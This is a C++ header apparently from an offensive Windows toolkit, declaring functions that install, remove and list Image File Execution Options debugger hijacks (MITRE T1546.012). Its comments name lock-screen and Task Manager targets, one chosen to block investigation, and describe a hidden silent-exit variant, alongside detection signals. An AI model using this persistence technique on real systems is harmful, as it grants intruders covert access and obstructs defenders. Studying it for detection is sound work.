#pragma once
#ifndef IFEOHIJACK_H
#define IFEOHIJACK_H
#include "common.h"

// IFEOHijack — Image File Execution Options debugger hijack (T1546.012).
//
// IFEO (Image File Execution Options) is a Windows feature that lets a debugger
// be attached to a process at launch. By setting the "Debugger" value under
// HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>
// Windows launches our executable INSTEAD of the target whenever <exe> is started.
//
// Common targets for persistence:
//   - sethc.exe    (Sticky Keys — triggers from lock screen, no login needed)
//   - utilman.exe  (Utility Manager — triggers from lock screen)
//   - osk.exe      (On-Screen Keyboard)
//   - magnify.exe  (Magnifier)
//   - narrator.exe (Narrator)
//   - taskmgr.exe  (fires when user opens Task Manager — can block investigation)
//
// Requires: HKLM write = admin/SYSTEM privilege.
//
// What a strong detector catches:
//   - Sysmon EID 13 (registry set value) on IFEO key
//   - Windows Defender ATP: IFEO modification is a built-in detection rule
//   - Autoruns / Sysinternals flag IFEO entries that don't point to a debugger
//
// MITRE T1546.012 — Event Triggered Execution: Image File Execution Options Injection

namespace IFEOHijack {
    // Install debugger hijack: whenever `targetExe` (basename) is launched,
    // Windows runs `ourExe targetExe [args]` instead.
    std::string Install(const char* targetExe, const char* ourExe);

    // Remove the hijack for `targetExe`
    std::string Remove(const char* targetExe);

    // List all IFEO Debugger entries currently set
    std::string List();

    // Install GlobalFlag silent exit monitor variant:
    // Sets GlobalFlag=0x200 + ReportingMode=1 on targetExe — the process
    // spawns a "monitor" (our exe) that runs alongside it invisibly.
    // Does NOT replace the target — both run simultaneously.
    std::string InstallSilentExit(const char* targetExe, const char* monitorExe);
}

#endif
